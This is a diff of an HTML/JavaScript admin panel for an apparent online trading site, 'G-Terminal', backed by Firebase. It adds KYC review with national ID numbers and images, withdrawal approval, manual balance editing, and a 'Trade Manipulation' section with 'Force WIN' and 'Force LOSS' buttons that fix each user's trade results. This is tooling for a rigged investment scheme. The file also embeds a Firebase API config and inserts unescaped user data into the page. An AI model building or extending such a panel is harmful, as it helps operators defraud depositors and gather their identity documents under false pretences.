@@ -1,68 +1,155 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><title>G-Terminal Admin</title>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Master Admin | G-Terminal</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
     <style>
-        body { background: #0b0e11; color: white; font-family: sans-serif; padding: 20px; }
-        .box { background: #1e2329; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #2b3139; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 10px; border: 1px solid #2b3139; text-align: left; }
-        button { padding: 5px 10px; cursor: pointer; border: none; border-radius: 3px; font-weight: bold; }
+        :root { --bg: #0b0e11; --card: #1e2329; --yellow: #f0b90b; --green: #02c076; --red: #f6465d; --text: #ffffff; }
+        body { background: var(--bg); color: var(--text); font-family: sans-serif; padding: 20px; }
+        .section { background: var(--card); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #2b3139; }
+        h2 { color: var(--yellow); border-bottom: 1px solid #333; padding-bottom: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #2b3139; font-size: 0.9rem; }
+        th { color: #848e9c; }
+        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; }
+        .btn-ok { background: var(--green); color: white; }
+        .btn-no { background: var(--red); color: white; }
+        .btn-win { background: var(--green); color: black; width: 100%; margin-top: 5px; }
+        .btn-loss { background: var(--red); color: white; width: 100%; margin-top: 5px; }
+        img { width: 50px; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h3>Update Deposit Numbers</h3>
-        <input type="text" id="pay-val" placeholder="Number/Address" style="padding:10px;">
-        <select id="pay-meth" style="padding:10px;">
-            <option value="easypaisa">EasyPaisa</option>
-            <option value="jazzcash">JazzCash</option>
-            <option value="trc20">USDT</option>
-        </select>
-        <button onclick="savePay()" style="background:#f0b90b;">Update</button>
+    <h1>G-Terminal Admin Panel</h1>
+
+    <div class="section">
+        <h2>🆔 KYC Requests</h2>
+        <table id="kyc-table">
+            <thead>
+                <tr><th>User</th><th>Details</th><th>CNIC</th><th>Action</th></tr>
+            </thead>
+            <tbody id="kyc-list"></tbody>
+        </table>
     </div>
 
-    <div class="box">
-        <h3>User Management (Force Win/Loss)</h3>
-        <table id="user-list">
-            <tr><th>Email</th><th>Balance</th><th>Control</th><th>Action</th></tr>
+    <div class="section">
+        <h2>💰 Withdrawal Requests</h2>
+        <table id="withdraw-table">
+            <thead>
+                <tr><th>User</th><th>Amount</th><th>Method/Acc</th><th>Action</th></tr>
+            </thead>
+            <tbody id="withdraw-list"></tbody>
+        </table>
+    </div>
+
+    <div class="section">
+        <h2>👥 Users & Trade Manipulation</h2>
+        <table id="user-table">
+            <thead>
+                <tr><th>User Email</th><th>Balance</th><th>Force Result</th></tr>
+            </thead>
+            <tbody id="user-list"></tbody>
         </table>
     </div>
 
     <script>
+        // Firebase Config (Wahi purana use karein)
         const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        function savePay() {
-            const m = document.getElementById('pay-meth').value;
-            const v = document.getElementById('pay-val').value;
-            db.ref('admin_settings/payments/' + m).set(v).then(() => alert("Saved!"));
-        }
-
+        // --- Load KYC ---
         db.ref('users').on('value', snap => {
-            const users = snap.val();
-            let html = '<tr><th>Email</th><th>Balance</th><th>Control</th><th>Action</th></tr>';
-            for(let id in users) {
-                html += `<tr>
-                    <td>${users[id].email}</td>
-                    <td>$${users[id].balance}</td>
-                    <td style="color:#f0b90b">${users[id].control}</td>
+            let kycHTML = "";
+            let userHTML = "";
+            snap.forEach(child => {
+                const u = child.val();
+                const uid = child.key;
+
+                // KYC Pending List
+                if(u.kyc_status === "PENDING") {
+                    kycHTML += `<tr>
+                        <td>${u.email}</td>
+                        <td>Name: ${u.kyc_data.name}<br>CNIC: ${u.kyc_data.cnic}</td>
+                        <td><img src="${u.kyc_data.image}" onclick="window.open(this.src)"></td>
+                        <td>
+                            <button class="btn btn-ok" onclick="updateKYC('${uid}', 'APPROVED')">Approve</button>
+                            <button class="btn btn-no" onclick="updateKYC('${uid}', 'REJECTED')">Reject</button>
+                        </td>
+                    </tr>`;
+                }
+
+                // Users Trade Control List
+                userHTML += `<tr>
+                    <td>${u.email}</td>
+                    <td><input type="number" value="${u.balance}" onchange="updateBal('${uid}', this.value)" style="width:80px; background:#000; color:var(--yellow); border:1px solid #444;"></td>
                     <td>
-                        <button onclick="setMode('${id}', 'WIN')" style="background:#02c076">WIN</button>
-                        <button onclick="setMode('${id}', 'LOSS')" style="background:#f6465d">LOSS</button>
-                        <button onclick="setMode('${id}', 'NORMAL')">X</button>
+                        <button class="btn btn-win" onclick="setControl('${uid}', 'WIN')">Force WIN</button>
+                        <button class="btn btn-loss" onclick="setControl('${uid}', 'LOSS')">Force LOSS</button>
+                        <button class="btn" onclick="setControl('${uid}', 'NORMAL')" style="width:100%; margin-top:5px;">Normal</button>
                     </td>
                 </tr>`;
-            }
-            document.getElementById('user-list').innerHTML = html;
+            });
+            document.getElementById('kyc-list').innerHTML = kycHTML;
+            document.getElementById('user-list').innerHTML = userHTML;
         });
 
-        function setMode(id, mode) {
-            db.ref('users/' + id).update({ control: mode });
+        // --- Load Withdrawals ---
+        db.ref('withdrawals').on('value', snap => {
+            let winHTML = "";
+            snap.forEach(child => {
+                const w = child.val();
+                const wid = child.key;
+                if(w.status === "PENDING") {
+                    winHTML += `<tr>
+                        <td>${w.email}</td>
+                        <td>$${w.amount}</td>
+                        <td>${w.method}<br>${w.account}</td>
+                        <td>
+                            <button class="btn btn-ok" onclick="approveWithdraw('${w.uid}', '${wid}', ${w.amount})">Paid</button>
+                            <button class="btn btn-no" onclick="rejectWithdraw('${wid}')">Reject</button>
+                        </td>
+                    </tr>`;
+                }
+            });
+            document.getElementById('withdraw-list').innerHTML = winHTML;
+        });
+
+        // --- Functions ---
+        function updateKYC(uid, status) {
+            db.ref('users/' + uid).update({ kyc_status: status });
+            alert("KYC " + status);
+        }
+
+        function updateBal(uid, newBal) {
+            db.ref('users/' + uid).update({ balance: parseFloat(newBal) });
+        }
+
+        function setControl(uid, mode) {
+            db.ref('users/' + uid).update({ control: mode });
+            alert("User set to: " + mode);
+        }
+
+        function approveWithdraw(uid, wid, amt) {
+            db.ref('users/' + uid).once('value', s => {
+                let currentBal = s.val().balance;
+                if(currentBal >= amt) {
+                    db.ref('users/' + uid).update({ balance: currentBal - amt });
+                    db.ref('withdrawals/' + wid).update({ status: "SUCCESS" });
+                    alert("Withdrawal Approved & Balance Deducted!");
+                } else {
+                    alert("User doesn't have enough balance anymore!");
+                }
+            });
+        }
+
+        function rejectWithdraw(wid) {
+            db.ref('withdrawals/' + wid).update({ status: "REJECTED" });
+            alert("Withdrawal Rejected!");
         }
     </script>
 </body>
